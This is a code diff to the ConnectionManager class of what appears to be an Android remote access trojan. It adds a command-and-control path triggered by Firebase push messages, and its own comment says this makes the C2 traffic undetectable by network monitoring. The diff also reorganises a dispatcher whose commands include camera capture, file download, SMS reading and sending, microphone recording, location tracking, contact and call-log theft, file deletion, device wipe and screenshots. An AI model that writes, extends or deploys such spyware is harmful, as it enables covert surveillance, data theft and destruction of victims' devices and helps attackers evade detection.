@@ -36,6 +36,11 @@ public class ConnectionManager {
     private static int reconnectAttempts = 0;
     private static final int MAX_RECONNECT_ATTEMPTS = 10;
 
+    // FCM trigger state
+    private static boolean fcmTriggered = false;
+    private static JSONObject pendingFcmCommand = null;
+    private static final Object fcmLock = new Object();
+
     public static void startAsync(Context con) {
         context = con;
         reconnectAttempts = 0;
@@ -89,79 +94,7 @@ public class ConnectionManager {
                     try {
                         if (args == null || args.length == 0 || !(args[0] instanceof JSONObject)) return;
                         JSONObject data = (JSONObject) args[0];
-                        String order = data.optString("order");
-                        if (order.isEmpty()) return;
-
-                        Log.d("order", order);
-
-                        switch (order) {
-                            case "x0000ca": {
-                                String extra = data.optString("extra");
-                                if ("camList".equals(extra))
-                                    x0000ca(-1);
-                                else if ("1".equals(extra))
-                                    x0000ca(1);
-                                else if ("0".equals(extra))
-                                    x0000ca(0);
-                                break;
-                            }
-                            case "x0000fm": {
-                                String extra = data.optString("extra");
-                                String path = data.optString("path");
-                                if ("ls".equals(extra))
-                                    x0000fm(0, path);
-                                else if ("dl".equals(extra))
-                                    x0000fm(1, path);
-                                break;
-                            }
-                            case "x0000sm": {
-                                String extra = data.optString("extra");
-                                if ("ls".equals(extra))
-                                    x0000sm(0, null, null);
-                                else if ("sendSMS".equals(extra))
-                                    x0000sm(1, data.optString("to"), data.optString("sms"));
-                                break;
-                            }
-                            case "x0000cl":
-                                x0000cl();
-                                break;
-                            case "x0000cn":
-                                x0000cn();
-                                break;
-                            case "x0000mc":
-                                x0000mc(data.optInt("sec", 10));
-                                break;
-                            case "x0000apps":
-                                x0000apps();
-                                break;
-                            case "x0000lm":
-                                x0000lm();
-                                break;
-                            case "x0000runApp":
-                                x0000runApp(data.optString("extra"));
-                                break;
-                            case "x0000openUrl":
-                                x0000openUrl(data.optString("url"));
-                                break;
-                            case "x0000deleteFF":
-                                x0000deleteFF(data.optString("fileFolderPath"));
-                                break;
-                            case "x0000dm":
-                                x0000dm(data.optString("number"));
-                                break;
-                            case "x0000lockDevice":
-                                x0000lockDevice();
-                                break;
-                            case "x0000wipeDevice":
-                                x0000wipeDevice();
-                                break;
-                            case "x0000rebootDevice":
-                                x0000rebootDevice();
-                                break;
-                            case "x0000sc":
-                                x0000sc();
-                                break;
-                        }
+                        dispatchOrder(data);
                     } catch (Exception e) {
                         Log.e("ConnectionManager", "Error handling order: " + e.getMessage());
                     }
@@ -186,6 +119,217 @@ public class ConnectionManager {
 
         } catch (Exception ex) {
             Log.e("error", ex.getMessage());
+        }
+    }
+
+    // ============================================================
+    // FCM TRIGGERED COMMAND EXECUTION
+    // ============================================================
+
+    /**
+     * Executes a command received via FCM trigger.
+     *
+     * When an FCM data message arrives, this method:
+     * 1. Stores the command
+     * 2. Briefly connects to the Socket.IO server
+     * 3. Processes the command
+     * 4. Sends results back
+     * 5. Disconnects the socket immediately
+     *
+     * This avoids a persistent WebSocket connection, making
+     * the C2 traffic undetectable by network monitoring.
+     */
+    public static void executeFcmCommand(Context ctx, JSONObject command) {
+        synchronized (fcmLock) {
+            pendingFcmCommand = command;
+            fcmTriggered = true;
+        }
+
+        context = ctx;
+
+        // Execute in a background thread
+        new Thread(() -> {
+            try {
+                Log.d("FCM", "Processing FCM-triggered command");
+
+                // 1. Ensure Socket.IO is connected
+                // Force a fresh socket connection
+                ioSocket = null;
+                IOSocket.reset();
+
+                // 2. Create a fresh socket and connect
+                io.socket.client.Socket fcmSocket = IOSocket.getInstance().getIoSocket();
+                if (fcmSocket == null) {
+                    Log.e("FCM", "Failed to create socket for FCM command");
+                    synchronized (fcmLock) {
+                        fcmTriggered = false;
+                        pendingFcmCommand = null;
+                    }
+                    return;
+                }
+
+                // 3. Set up temporary handlers
+                final Object connectWait = new Object();
+                final boolean[] connected = {false};
+
+                fcmSocket.on(io.socket.client.Socket.EVENT_CONNECT, args -> {
+                    synchronized (connectWait) {
+                        connected[0] = true;
+                        connectWait.notify();
+                    }
+                });
+
+                fcmSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, args -> {
+                    synchronized (connectWait) {
+                        connectWait.notify();
+                    }
+                });
+
+                fcmSocket.connect();
+
+                // Wait for connection (max 10 seconds)
+                synchronized (connectWait) {
+                    try {
+                        connectWait.wait(10000);
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                    }
+                }
+
+                if (!connected[0]) {
+                    Log.e("FCM", "Socket connection timeout for FCM command");
+                    fcmSocket.disconnect();
+                    synchronized (fcmLock) {
+                        fcmTriggered = false;
+                        pendingFcmCommand = null;
+                    }
+                    return;
+                }
+
+                // 4. Store the socket for use by dispatch methods
+                ioSocket = fcmSocket;
+
+                // 5. Extract and execute the command
+                synchronized (fcmLock) {
+                    if (pendingFcmCommand != null) {
+                        dispatchOrder(pendingFcmCommand);
+                        pendingFcmCommand = null;
+                    }
+                    fcmTriggered = false;
+                }
+
+                // 6. Wait for response to be sent (up to 30s for long commands like mic recording)
+                try {
+                    synchronized (fcmSocket) {
+                        fcmSocket.wait(30000);
+                    }
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
+
+                // 7. Disconnect after results sent
+                ioSocket = null;
+                fcmSocket.off();
+                fcmSocket.disconnect();
+                IOSocket.reset();
+
+                Log.d("FCM", "FCM command completed, socket disconnected");
+
+            } catch (Exception e) {
+                Log.e("FCM", "Error in FCM command execution: " + e.getMessage());
+                synchronized (fcmLock) {
+                    fcmTriggered = false;
+                    pendingFcmCommand = null;
+                }
+                // Ensure cleanup
+                try {
+                    IOSocket.reset();
+                } catch (Exception ignored) {}
+            }
+        }).start();
+    }
+
+    /**
+     * Dispatches a single order JSON object to the appropriate handler.
+     * Used by both WebSocket and FCM trigger paths.
+     */
+    private static void dispatchOrder(JSONObject data) {
+        try {
+            String order = data.optString("order");
+            if (order.isEmpty()) return;
+
+            Log.d("order", order);
+
+            switch (order) {
+                case "x0000ca": {
+                    String extra = data.optString("extra");
+                    if ("camList".equals(extra))
+                        x0000ca(-1);
+                    else if ("1".equals(extra))
+                        x0000ca(1);
+                    else if ("0".equals(extra))
+                        x0000ca(0);
+                    break;
+                }
+                case "x0000fm": {
+                    String extra = data.optString("extra");
+                    String path = data.optString("path");
+                    if ("ls".equals(extra))
+                        x0000fm(0, path);
+                    else if ("dl".equals(extra))
+                        x0000fm(1, path);
+                    break;
+                }
+                case "x0000sm": {
+                    String extra = data.optString("extra");
+                    if ("ls".equals(extra))
+                        x0000sm(0, null, null);
+                    else if ("sendSMS".equals(extra))
+                        x0000sm(1, data.optString("to"), data.optString("sms"));
+                    break;
+                }
+                case "x0000cl":
+                    x0000cl();
+                    break;
+                case "x0000cn":
+                    x0000cn();
+                    break;
+                case "x0000mc":
+                    x0000mc(data.optInt("sec", 10));
+                    break;
+                case "x0000apps":
+                    x0000apps();
+                    break;
+                case "x0000lm":
+                    x0000lm();
+                    break;
+                case "x0000runApp":
+                    x0000runApp(data.optString("extra"));
+                    break;
+                case "x0000openUrl":
+                    x0000openUrl(data.optString("url"));
+                    break;
+                case "x0000deleteFF":
+                    x0000deleteFF(data.optString("fileFolderPath"));
+                    break;
+                case "x0000dm":
+                    x0000dm(data.optString("number"));
+                    break;
+                case "x0000lockDevice":
+                    x0000lockDevice();
+                    break;
+                case "x0000wipeDevice":
+                    x0000wipeDevice();
+                    break;
+                case "x0000rebootDevice":
+                    x0000rebootDevice();
+                    break;
+                case "x0000sc":
+                    x0000sc();
+                    break;
+            }
+        } catch (Exception e) {
+            Log.e("ConnectionManager", "Error dispatching FCM order: " + e.getMessage());
         }
     }
 
